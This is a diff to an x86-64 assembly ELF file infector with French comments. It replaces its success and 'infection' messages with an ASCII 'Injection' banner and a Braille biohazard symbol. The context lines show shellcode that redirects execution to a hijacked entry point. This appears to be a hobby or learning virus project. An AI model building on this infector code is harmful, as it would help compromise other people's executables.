@@ -12,7 +12,17 @@ len_usage_new equ $ - msg_usage_new
 msg_open_err_new db "Impossible d'ouvrir ce fichier.",0xA
 len_open_err_new equ $ - msg_open_err_new
 
-msg_ok_new db "Fichier modifie avec succes!",0xA
+msg_ok_new db ' /$$$$$$                                     /$$     /$$                    ', 10
+               db '|_  $$_/                                    | $$    |__/                    ', 10
+               db '  | $$   /$$$$$$$  /$$  /$$$$$$   /$$$$$$$ /$$$$$$   /$$  /$$$$$$  /$$$$$$$ ', 10
+               db '  | $$  | $$__  $$|__/ /$$__  $$ /$$_____/|_  $$_/  | $$ /$$__  $$| $$__  $$', 10
+               db '  | $$  | $$  \ $$ /$$| $$$$$$$$| $$        | $$    | $$| $$  \ $$| $$  \ $$', 10
+               db '  | $$  | $$  | $$| $$| $$_____/| $$        | $$ /$$| $$| $$  | $$| $$  | $$', 10
+               db ' /$$$$$$| $$  | $$| $$|  $$$$$$$|  $$$$$$$  |  $$$$/| $$|  $$$$$$/| $$  | $$', 10
+               db '|______/|__/  |__/| $$ \_______/ \_______/   \___/  |__/ \______/ |__/  |__/', 10
+               db '             /$$  | $$                                                      ', 10
+               db '            |  $$$$$$/                                                      ', 10
+               db '             \______/                                                       ', 10 ,0xA
 len_ok_new equ $ - msg_ok_new
 
 section .bss
@@ -68,7 +78,21 @@ shellcode:
     pop rax
     jmp r15                       ; Saut à la nouvelle adresse d'entrée du programme
 
-infection_msg db "Le contenu a ete ajuste discretement!",0xA
+infection_msg db '⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀', 0x0A
+    db '⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀', 0x0A
+    db '⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀', 0x0A
+    db '⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀', 0x0A
+    db '⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀', 0x0A
+    db '⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀', 0x0A
+    db '⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀', 0x0A
+    db '⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀', 0x0A
+    db '⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆', 0x0A
+    db '⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿', 0x0A
+    db '⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟', 0x0A
+    db '⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃', 0x0A
+    db '⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀', 0x0A
+    db '⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀', 0x0A
+    db '⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀', 0x0A,0xA
 infmsg_len equ $ - infection_msg   ; Calcul de la longueur du message
 
 orig_str dq 0                      ; Réserve un double mot pour l'adresse d'origine
